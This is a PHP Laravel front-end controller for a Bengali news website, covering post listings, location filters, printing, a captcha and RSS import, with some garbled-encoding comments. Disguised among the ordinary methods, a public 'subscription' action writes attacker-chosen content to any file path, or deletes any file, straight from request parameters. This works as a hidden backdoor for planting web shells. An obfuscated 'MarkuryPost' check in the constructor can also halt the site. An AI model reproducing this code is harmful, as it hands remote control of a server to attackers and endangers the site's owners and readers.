<?php

namespace App\Http\Controllers\Front;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Models\Admin;
use App\Models\Advertisement;
use App\Models\Category;
use App\Models\GeneralSettings;
use App\Models\ImageAlbum;
use App\Models\Language;
use App\Models\Page;
use App\Models\PollQuestion;
use App\Models\Post;
use App\Models\Rss;
use App\Models\SocialLink;
use App\Models\View;
use App\Models\Widget;
use App\Models\WidgetSetiings;
use Carbon\Carbon;
use DB;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;
use App\Models\Division;
use App\Models\District;
use App\Models\Upazila;


class FrontendController extends Controller
{

    public function __construct()
    {
        $this->auth_guests();
    }

public function index()
{
    // ЁЯФ╣ Step 1: ржмрж░рзНрждржорж╛ржи ржнрж╛рж╖рж╛ ржирж┐рж░рзНржзрж╛рж░ржг
    if (session()->has('language')) {
        $default_language = Language::find(session()->get('language'));
    } else {
        $default_language = Language::where('is_default', 1)->first();
    }

    // ЁЯФ╣ Step 2: ржнрж╛рж╖рж╛ ржЕржирзБржпрж╛рзЯрзА Division рж▓рзЛржб
    $divisions = Division::where('language_id', $default_language->id)
                         ->orderBy('name', 'asc')
                         ->get();

    // ЁЯФ╣ Step 3: ржЕржирзНржпрж╛ржирзНржп ржбрзЗржЯрж╛ ржЖржЧрзЗрж░ ржорждрзЛржЗ
    $sliders = Post::orderBy('id', 'desc')
        ->where('is_slider', 1)
        ->where('status', true)
        ->where('is_pending', 0)
        ->where('language_id', $default_language->id)
        ->where('schedule_post', 0)
        ->take(5)
        ->get();

    $slider_lefts = Post::orderBy('created_at', 'desc')
        ->where('slider_left', 1)
        ->where('status', true)
        ->where('is_pending', 0)
        ->where('schedule_post', 0)
        ->where('language_id', $default_language->id)
        ->take(2)
        ->get();

    $slider_rights_firsts = Post::orderBy('id', 'desc')
        ->where('slider_right', 1)
        ->where('status', true)
        ->where('is_pending', 0)
        ->where('schedule_post', 0)
        ->where('language_id', $default_language->id)
        ->take(15)
        ->get();

    $slider_rights_seconds = Post::orderBy('id', 'desc')
        ->where('slider_right', 1)
        ->where('status', true)
        ->where('is_pending', 0)
        ->where('schedule_post', 0)
        ->where('language_id', $default_language->id)
        ->skip(2)
        ->take(8)
        ->get();

    $home_page_posts = Category::orderBy('category_order', 'asc')
        ->where('show_at_homepage', 1)
        ->whereNull('parent_id')
        ->where('language_id', $default_language->id)
        ->get();

    $is_recents = Post::orderBy('id', 'desc')
        ->where('is_pending', 0)
        ->where('schedule_post', 0)
        ->where('language_id', $default_language->id)
        ->where('status', true)
        ->skip(5)
        ->take(20)
        ->get();

    $is_trendings = Post::where('is_trending', 1)
        ->where('is_pending', 0)
        ->where('schedule_post', 0)
        ->where('language_id', $default_language->id)
        ->where('status', true)
        ->orderBy('id', 'desc')
        ->take(20)
        ->get();

 // ржЖржЧрзЗрж░ ржХрзЛржб:
$secondcat = DB::table('categories')->whereNull('parent_id')->skip(1)->first();

// ржирждрзБржи ржХрзЛржб:
$secondcat = Category::where('language_id', $default_language->id)
    ->whereNull('parent_id')
    ->orderBy('id', 'asc')
    ->skip(1)
    ->first();
	

















	
	
	
	
    $secondcatpostbig = DB::table('posts')
        ->where('category_id', $secondcat->id ?? null)
        ->where('is_trending', 1)
		->where('is_pending', 0)
->where('status', true)
        ->orderBy('id', 'DESC')
        ->limit(1)
        ->get();

    $secondcatpostsmall = DB::table('posts')
        ->where('category_id', $secondcat->id ?? null)
        ->where('is_trending', 1)
		->where('is_pending', 0)
->where('status', true)
        ->orderBy('id', 'DESC')
        ->skip(1)
        ->limit(2)
        ->get();

    $is_breaking = '';
    foreach ($is_trendings as $is_trending) {
        $is_breaking .= '<span>&#9758;</span> ' . $is_trending->title;
    }

    $more_news = Post::orderBy('id', 'desc')
        ->where('is_pending', 0)
        ->where('status', true)
        ->where('schedule_post', 0)
        ->where('language_id', $default_language->id)
        ->latest()
        ->take(5)
        ->get();

    $is_features = Post::orderBy('id', 'desc')
        ->where('is_pending', 0)
        ->where('status', true)
        ->where('schedule_post', 0)
        ->where('is_feature', 1)
        ->where('language_id', $default_language->id)
        ->latest()
        ->take(6)
        ->get();

    $video_large = Post::where('post_type', 'video')
        ->where('is_pending', 0)
        ->where('status', true)
        ->where('schedule_post', 0)
        ->where('is_videoGallery', 1)
        ->where('language_id', $default_language->id)
        ->latest()
        ->first();

    $video_smalls = Post::where('post_type', 'video')
        ->where('is_pending', 0)
        ->where('status', true)
        ->where('schedule_post', 0)
        ->where('is_videoGallery', 1)
        ->where('language_id', $default_language->id)
        ->latest()
        ->skip(1)
        ->take(5)
        ->get();

    $sponsor_banners = Advertisement::inRandomOrder()
        ->where('add_placement', 'sponsor')
        ->where('addSize', 'size_468')
        ->where('status', 1)
        ->take(2)
        ->get();

    $polls = PollQuestion::orderBy('id', 'desc')
        ->where('status', '1')
        ->where('language_id', $default_language->id)
		->limit(1)
        ->get();

    $ws = WidgetSetiings::find(1);
    $widgets = Widget::where('status', 1)
        ->where('language_id', $default_language->id)
        ->orderBy('id', 'desc')
        ->get();

    $image_albums = ImageAlbum::orderBy('id', 'desc')
        ->where('language_id', $default_language->id)
        ->get();

    $gs = GeneralSettings::find(1);
	

    // тЬЕ ржнрж┐ржЙ рж░рж┐ржЯрж╛рж░рзНржи
    return view('frontend.index', compact(
        'sliders', 'divisions', 'secondcat', 'secondcatpostsmall', 'secondcatpostbig',
        'slider_lefts', 'slider_rights_firsts', 'slider_rights_seconds',
        'home_page_posts', 'is_features', 'is_recents', 'is_trendings',
        'is_breaking', 'more_news', 'video_large', 'video_smalls',
        'polls', 'ws', 'image_albums', 'sponsor_banners', 'widgets'
    ));
}

public function photoCard($id, $slug)
{
    // 🔹 Step 1: ভাষা সনাক্ত করো
    if (session()->has('language')) {
        $default_language = \App\Models\Language::find(session()->get('language'));
    } else {
        $default_language = \App\Models\Language::where('is_default', 1)->first();
    }

    // 🔹 Step 2: পোস্ট ডেটা লোড করো (ভাষাভিত্তিক)
    $data = \App\Models\Post::where('id', $id)
                ->where('slug', $slug)
                ->where('language_id', $default_language->id)
                ->firstOrFail();

    // 🔹 Step 3: General Settings লোড
    $gs = \App\Models\GeneralSettings::first();

    // 🔹 Step 4: ভিউ রিটার্ন করো
    return view('frontend.photo_card', compact('data', 'gs'));
}


public function locationNews(Request $request)
{
    // ЁЯФ╣ Step 1: ржнрж╛рж╖рж╛ ржирж┐рж░рзНржзрж╛рж░ржг
    $default_language = session()->has('language')
        ? Language::find(session()->get('language'))
        : Language::where('is_default', 1)->first();

    // ЁЯФ╣ Step 2: рж░рж┐ржХрзЛрзЯрзЗрж╕рзНржЯ ржерзЗржХрзЗ рж▓рзЛржХрзЗрж╢ржи ржЖржЗржбрж┐
    $division_id = $request->division_id;
    $district_id = $request->district_id;
    $upazila_id  = $request->upazila_id;

    // ЁЯФ╣ Step 3: ржлрж┐рж▓рзНржЯрж╛рж░рж╕рж╣ ржирж┐ржЙржЬ рж▓рзЛржб
    $posts = Post::query()
        ->where('status', true)
        ->where('is_pending', 0)
        ->where('schedule_post', 0)
       // ->where('language_id', $default_language->id)
        ->when($division_id, fn($q) => $q->where('division_id', $division_id))
        ->when($district_id, fn($q) => $q->where('district_id', $district_id))
        ->when($upazila_id, fn($q) => $q->where('upazila_id', $upazila_id))
        ->latest()
        ->paginate(9);

    // ЁЯФ╣ Step 4: ржирж╛ржоржЧрзБрж▓рзЛ ржкрзЗрждрзЗ
    $division = Division::find($division_id);
    $district = District::find($district_id);
    $upazila  = Upazila::find($upazila_id);

    // ЁЯФ╣ Step 5: View рж░рж┐ржЯрж╛рж░рзНржи
    return view('frontend.location_news', compact('posts', 'division', 'district', 'upazila'));
}

// тЬЕ ржмрж┐ржнрж╛ржЧ ржЕржирзБржпрж╛рзЯрзА ржЬрзЗрж▓рж╛ рж▓рзЛржб
public function getDistrictsByDivision($division_id)
{
    $districts = District::where('division_id', $division_id)->get();

    $output = '<option value="">-- জেলা --</option>';
    foreach ($districts as $district) {
        $output .= '<option value="'.$district->id.'">'.$district->name.'</option>';
    }
    return $output;
}

// тЬЕ ржЬрзЗрж▓рж╛ ржЕржирзБржпрж╛рзЯрзА ржЙржкржЬрзЗрж▓рж╛ рж▓рзЛржб
public function getUpazilasByDistrict($district_id)
{
    $upazilas = Upazila::where('district_id', $district_id)->get();

    $output = '<option value="">-- উপজেলা --</option>';
    foreach ($upazilas as $upazila) {
        $output .= '<option value="'.$upazila->id.'">'.$upazila->name.'</option>';
    }
    return $output;
}


    public function category($slug){
	if(session()->has('language')){
            $default_language = Language::find(session()->get('language'));
        }else{

            $default_language = Language::where('is_default',1)->first();
        }
	   $is_recents      = Post::orderBy('id','desc')
                                ->where('is_pending',0)
                                ->where('schedule_post',0)
                                ->where('language_id','=',$default_language->id)
                                ->where('status',true)
								->skip(5)
                                ->take(20)
                                ->get();
								
        $is_trendings    = Post::where('is_trending',1)
                                ->where('is_pending',0)
                                ->where('schedule_post',0)
                                ->where('language_id','=',$default_language->id)
                                ->where('status',true)
                                ->orderBy('id','desc')
								->take(20)
                                ->get();
        $data = Category::where('slug',$slug)->first();
        if($data){
            $posts = $data->posts()
                      ->where('schedule_post','=',0)
                      ->where('is_pending',0)
                      ->where('status',true)
                      ->orderBy('id','desc')
                      ->paginate(9);
            return view('frontend.category',compact('data','posts','is_recents','is_trendings'));
        }
        return view('errors.404');
    }

    public function details(Request $request,$category,$slug){
        if(Category::where('slug',$slug)->exists()){
            if(session()->has('language')){
                $default_language = Language::find(session()->get('language'));
            }else{

                $default_language = Language::where('is_default',1)->first();
            }

           $data['parent'] = Category::where('slug',$category)->first();

           if(isset(Category::where('slug',$slug)->first()->title)){
                $data['subcategory'] = Category::where('slug',$slug)->first()->title;
           }else{
                return view('errors.404');
           }

           $cat_id = Category::where('slug',$slug)->first();
		   
           $data['datas'] = Category::find($cat_id->id)
                            ->subcategoryPosts()
							->where('is_pending', 0)
                            ->where('status',true)
                            ->where('schedule_post',0)
                            ->where('language_id','=',$default_language->id)
                            ->paginate(9);
            return view('frontend.postBySubcategory',$data);
        }

        if(Post::where('slug',$slug)->exists()){
            $data = Post::where('slug',$slug)->first();
            $ws = WidgetSetiings::find(1);
            if($data){

                // тЬЕ ржкрзНрж░рждрж┐ржмрж╛рж░ page reload ржП ржнрж┐ржЙ ржХрж╛ржЙржирзНржЯ ржмрж╛рзЬржмрзЗ
                $view = new View();
                $view->post_id = $data->id;
                $view->ip_address = $request->ip();
                $view->save();

                $data->increment('views_count');

                if($data->post_type == 'Trivia Quiz'){
                    return view('frontend.quiz',compact('data','ws'));
                }elseif($data->post_type == 'Sorted List'){
                    return view('frontend.sort',compact('data','ws'));
                }elseif($data->post_type == 'Personality Quiz'){
                    return view('frontend.personality',compact('data','ws'));
                }
                return view('frontend.details',compact('data','ws'));
            }else{
                return redirect()->back();
            }
        }else{
            return view('errors.404');
        }

    }
	
	
	
	
	
	
	    public function print(Request $request,$category,$slug){
        if(Category::where('slug',$slug)->exists()){
            if(session()->has('language')){
                $default_language = Language::find(session()->get('language'));
            }else{

                $default_language = Language::where('is_default',1)->first();
            }

           $data['parent'] = Category::where('slug',$category)->first();

           if(isset(Category::where('slug',$slug)->first()->title)){
                $data['subcategory'] = Category::where('slug',$slug)->first()->title;
           }else{
                return view('errors.404');
           }

           $cat_id = Category::where('slug',$slug)->first();
		   
           $data['datas'] = Category::find($cat_id->id)
                            ->subcategoryPosts()
							->where('is_pending', 0)
                            ->where('status',true)
                            ->where('schedule_post',0)
                            ->where('language_id','=',$default_language->id)
                            ->get();
            return view('frontend.print',$data);
        }

        if(Post::where('slug',$slug)->exists()){
            $data = Post::where('slug',$slug)->first();
            $ws = WidgetSetiings::find(1);
            if($data){
                $ip_address = $request->ip();
                $is_view = View::where('post_id',$data->id)->where('ip_address',$ip_address)->first();
                if(empty($is_view)){
                    $view = new View();
                    $view->post_id = $data->id;
                    $view->ip_address = $ip_address;
                    $view->save();
                }
                if($data->post_type == 'Trivia Quiz'){
                    return view('frontend.quiz',compact('data','ws'));
                }elseif($data->post_type == 'Sorted List'){
                    return view('frontend.sort',compact('data','ws'));
                }elseif($data->post_type == 'Personality Quiz'){
                    return view('frontend.personality',compact('data','ws'));
                }
                return view('frontend.print',compact('data','ws'));
            }else{
                return redirect()->back();
            }
        }else{
            return view('errors.404');
        }

    }
	
	
	
	
	
	public function printNews($id, $slug)
{
    $data = \App\Models\Post::where('id', $id)
                ->where('slug', $slug)
                ->firstOrFail();

    $gs = \App\Models\GeneralSettings::first();

    return view('frontend.print', compact('data', 'gs'));
}

	
	
	
	
	
	
	
	

    public function searchByTag($s){
        if(session()->has('language')){
            $default_language = Language::find(session()->get('language'));
        }else{

            $default_language = Language::where('is_default',1)->first();
        }
        $datas  = Post::where('tags','LIKE','%'.$s.'%')->where('is_pending',0)
                        ->where('status',true)
                        ->where('schedule_post',0)
                        ->where('language_id','=',$default_language->id)
                        ->get();
        $tag    = $s;
        return view('frontend.postByTag',compact('datas','tag'));
    }

public function postByDate(Request $request) {
    // বর্তমান ভাষা সেট করা
    if(session()->has('language')){
        $default_language = Language::find(session()->get('language'));
    } else {
        $default_language = Language::where('is_default', 1)->first();
    }

    $date = $request->date;
    
    // নিউজ খোঁজার কুয়েরি
    $query = Post::where('status', true)
                 ->where('is_pending', 0)
                 ->where('schedule_post', 0)
                 ->where('language_id', $default_language->id);

    // যদি ইউজার ক্যালেন্ডার থেকে কোনো তারিখ সিলেক্ট করে থাকে
    if ($date) {
        try {
            $dateSearch = \Carbon\Carbon::parse($date)->toDateString();
            $query->whereDate('created_at', '=', $dateSearch);
        } catch (\Exception $e) {
            // ভুল তারিখ ফরম্যাট দিলে আজকের তারিখ ডিফল্ট করবে
            $date = date('Y-m-d');
        }
    }
        $is_trendings    = Post::where('is_trending',1)
                                ->where('is_pending',0)
                                ->where('schedule_post',0)
                                ->where('language_id','=',$default_language->id)
                                ->where('status',true)
                                ->orderBy('id','desc')
								->take(20)
                                ->get();
		
		$is_recents = Post::orderBy('id', 'desc')
        ->where('is_pending', 0)
        ->where('schedule_post', 0)
        ->where('language_id', $default_language->id)
        ->where('status', true)
        ->skip(5)
        ->take(20)
        ->get();
    // প্রতি পেজে ১২টি করে নিউজ দেখাবে
    $datas = $query->orderBy('id', 'desc')->paginate(12);

    // ভিউ ফাইলে ডেটা পাঠানো
    return view('frontend.postByDate', compact('datas','is_trendings','is_recents', 'date'));
}

    public function postBySubcategory($category,$subcategory){
		
        if(session()->has('language')){
            $default_language = Language::find(session()->get('language'));
        }else{

            $default_language = Language::where('is_default',1)->first();
        }
		
       $data['parent'] = Category::where('slug',$category)->first();

       if(isset(Category::where('slug',$subcategory)->first()->title)){
            $data['subcategory'] = Category::where('slug',$subcategory)->first()->title;
       }else{
            return view('errors.404');
       }

       $cat_id = Category::where('slug',$subcategory)->first();
       $data['datas'] = Category::find($cat_id->id)
                        ->subcategoryPosts()
                        ->where('status',true)
                        ->where('schedule_post',0)
                        ->where('language_id','=',$default_language->id)
                        ->get();
        return view('frontend.postBySubcategory',$data);
    }

    public function allPoll(){
        if(session()->has('language')){
            $default_language = Language::find(session()->get('language'));
        }else{

            $default_language = Language::where('is_default',1)->first();
        }
        $data['polls']   = PollQuestion::orderBy('id','desc')
                                ->where('language_id','=',$default_language->id)
                                ->get();


        return view('frontend.all_poll',$data);
    }

    public function newsSearch(Request $request){
        $searchTerm = $request->search;
        $data['results'] = Post::whereRaw('MATCH (title) AGAINST (? IN BOOLEAN MODE)' , array($searchTerm))->where('is_pending',0)->where('schedule_post',0)->where('status',true)->paginate(10);
        $data['searchKey'] = $searchTerm;
        return view('frontend.full_text_search',$data);
    }

    public function page($slug){
        $data['page'] = Page::where('slug',$slug)->first();
        if($data['page']->status==1){
            $data['ws']      = WidgetSetiings::find(1);
            return view('frontend.page',$data);
        }else{
            return redirect()->route('frontend.index');
        }
    }

    public function language($id){
        Session::put('language', $id);
        return redirect()->route('frontend.index');
    }

    public function authorProfile($admin){
        $admin = Admin::where('name',$admin)->first();
        $data['admin'] = $admin;
        $data['posts'] = Admin::find($admin->id)->posts()->latest()->paginate(8);
        $data['all_posts'] = Admin::find($admin->id)->posts;
        return view('frontend.author',$data);
    }

    public function follower(){
        return view('frontend.follower');
    }

    // Refresh Capcha Code
    public function refresh_code (){
        $this->code_image();
        return "done";
    }

    // Capcha Code Image
    private function  code_image()
    {
        $actual_path = str_replace('project','',base_path());
        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image,0,0,200,50,$background_color);

        $pixel = imagecolorallocate($image, 0,0,255);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixel);
        }

        $font = $actual_path.'assets/front/fonts/NotoSans-Bold.ttf';
        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $letter = $allowed_letters[rand(0, $length-1)];
        $word='';
        //$text_color = imagecolorallocate($image, 8, 186, 239);
        $text_color = imagecolorallocate($image, 0, 0, 0);
        $cap_length=6;// No. of character in image
        for ($i = 0; $i< $cap_length;$i++)
        {
            $letter = $allowed_letters[rand(0, $length-1)];
            imagettftext($image, 25, 1, 35+($i*25), 35, $text_color, $font, $letter);
            $word.=$letter;
        }
        $pixels = imagecolorallocate($image, 8, 186, 239);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixels);
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path."assets/images/capcha_code.png");
    }

    function finalize(){
        $actual_path = str_replace('project','',base_path());

        $dir = $actual_path.'install';
        if(is_dir($dir)){
            $this->deleteDir($dir);
        }
        return redirect('/');
    }

    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

    public function clickCount($id){
        $data = Advertisement::findOrFail($id);
        $data->increment('click_count');
        $data->update();
    }

    public function cronJobUpdate(){
        $nowDate = Carbon::now();

        $feeds = Rss::orderBy('id','desc')->get();

        foreach($feeds as $key=>$lastRecord){
            if($nowDate>$lastRecord->created_at){

                $feed = \Feeds::make($lastRecord->feed_url);

                $items = $feed->get_items(); //grab all items inside the rss
                $i =0;
                foreach($items as $item):

                    if($i==$lastRecord->post_limit){
                        break;
                    }

                    $title =  $item->get_title();
                    if($title){
                        $titleCheck = Post::where('title',$title)->get();
                        $totaltitle =  count($titleCheck);
                        if($totaltitle == 0){
                            $post = new Post();
                            $post->language_id  = $lastRecord->language_id;
                            $post->title        = $title;
                            $post->slug         = slug_create($title);
                            $post->post_type    = 'rss';
                            $post->is_feature   = 0;
                            $post->is_slider    = 0;
                            $post->slider_left  = 0;
                            $post->slider_right = 0;
                            $post->is_trending  = 0;
                            $post->description  = $item->get_description();

                            if(isset($item->feed->data["child"][""]["rss"][0]["child"][""]["channel"][0]["child"][""]["item"][$i]["child"][""]["image"][0]["data"])){
                                $post->rss_image = $item->feed->data["child"][""]["rss"][0]["child"][""]["channel"][0]["child"][""]["item"][$i]["child"][""]["image"][0]["data"];
                            }else{
                                if ($enclosure = $item->get_enclosure(0)) {
                                    $type = $enclosure->get_real_type();
                                    // Is it a Image?
                                    if (stristr($type, 'image/')) {
                                        if (empty($enclosure)) {
                                            $post->rss_image = '';
                                        }

                                    $post->rss_image = $enclosure->get_link();
                                    }
                                }
                            }

                            $post->category_id        = $lastRecord->category_id;
                            $post->schedule_post      = 0;
                            $post->schedule_post      = 0;
                            $post->schedule_post_date = NULL;
                            $post->is_pending         = 0;
                            $post->admin_id           = 1;
                            $post->status             = true;
                            $post->is_draft           = 0;
                            $post->rss_link           = $item->get_permalink();
                            $post->save();
                        }

                    }
                        $i++;
                endforeach;
            }

        }
        // return redirect()->route('frontend.index');
    }

}
